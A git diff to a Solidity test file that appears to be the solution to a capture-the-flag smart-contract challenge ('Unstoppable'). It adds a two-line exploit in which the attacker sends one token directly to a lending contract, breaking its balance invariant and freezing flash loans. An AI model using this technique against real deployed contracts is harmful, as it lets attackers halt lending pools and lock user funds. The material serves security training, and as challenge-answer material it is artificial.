@@ -56,6 +56,10 @@ contract Unstoppable is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+
+        hoax(attacker);
+        dvt.transfer(address(unstoppableLender), 1);
+
         /** EXPLOIT END **/
         vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
         validation();
